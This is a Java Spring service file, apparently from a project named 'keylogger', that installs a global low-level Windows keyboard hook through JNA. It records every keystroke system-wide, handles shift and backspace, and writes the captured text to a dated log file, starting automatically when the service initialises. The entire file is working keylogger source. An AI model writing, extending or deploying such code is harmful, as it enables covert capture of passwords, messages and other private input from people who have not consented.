package com.badar.keylogger.Services;

import com.badar.keylogger.Helpers.KeyCodeConverter;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef.*;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import jakarta.annotation.PostConstruct;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Set;

@Service
public class GlobalKeyListenerService {
    private boolean leftShiftPressed = false;
    private boolean rightShiftPressed = false;
    private final StringBuilder storedInput = new StringBuilder();
    private final Object inputLock = new Object();
    private static HHOOK hHook;
    // creating a logger to log inputs
    private static final Logger logger = LoggerFactory.getLogger(GlobalKeyListenerService.class);

    public static final User32Extended user32 = User32Extended.INSTANCE;

    public interface User32Extended extends StdCallLibrary {
        User32Extended INSTANCE = Native.load("user32", User32Extended.class, W32APIOptions.UNICODE_OPTIONS);

        // creating a hook with attributes
        HHOOK SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, HMODULE hMod, int dwThreadId);
        LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
        boolean UnhookWindowsHookEx(HHOOK hhk);

        int GetMessage(MSG lpMsg, HWND hWnd, int wMsgFilterMin, int wMsgFilterMax);
        boolean TranslateMessage(MSG lpMsg);
        LRESULT DispatchMessage(MSG lpMsg);

        short GetKeyState(int vKey);
        HMODULE GetModuleHandle(String lpModuleName);
    }

    // initialize the method after the dependencies are loaded
    @PostConstruct
    public void init() {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            stopLogger();
            System.out.println("Service shutdown complete");
        }));
        if (!isRunByInstaller()) {
            logger.info("Initializing keylogger service...");
            new Thread(this::startKeylogger).start();
        }
    }
    private boolean isRunByInstaller() {
        return System.getProperty("l4j.installer") != null;
    }

    public void startKeylogger() {
        LowLevelKeyboardProc keyboardHook = (nCode, wParam, info) -> {
            if (nCode >= 0) {
                // Track shift state
                if (info.vkCode == WinUser.VK_LSHIFT) {
                    leftShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
                }
                else if (info.vkCode == WinUser.VK_RSHIFT) {
                    rightShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
                }
                // Process key presses
                if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                    boolean isShiftActive = leftShiftPressed || rightShiftPressed;
                    String keyChar = KeyCodeConverter.getKeyName(info.vkCode, isShiftActive);
                    synchronized(inputLock) {
                        if(info.vkCode == 0x08	){
                            storedInput.deleteCharAt(storedInput.length() -1);
                        }
                        storedInput.append(keyChar);
                        String pattern = "MM-dd-yyyy";  // formatting date style
                        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(pattern);
                        String fileName = "log_" + simpleDateFormat.format(new Date()) + ".txt";
                        File file = new File(fileName);
                        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                            writer.append(storedInput);
                        } catch (IOException e) {
                            throw new RuntimeException(e);
                        }
                        System.out.println(storedInput);
                    }
                }
            }
            return user32.CallNextHookEx(hHook, nCode, wParam, new LPARAM(Pointer.nativeValue(info.getPointer())));
        };

        hHook = user32.SetWindowsHookEx(
                WinUser.WH_KEYBOARD_LL,
                keyboardHook,
                null,  // Use null for global hooks
                0
        );

        if (hHook == null) {
            logger.error("Failed to install keyboard hook");
            return;
        }

        logger.info("Keyboard hook installed successfully");

        // Message pump
        MSG msg = new MSG();
        while (user32.GetMessage(msg, null, 0, 0) != 0) {
            user32.TranslateMessage(msg);
            user32.DispatchMessage(msg);
        }
    }

    public void stopLogger() {
        if (hHook != null) {
            user32.UnhookWindowsHookEx(hHook);
            hHook = null;
            logger.info("Keyboard hook uninstalled");
        }
    }
}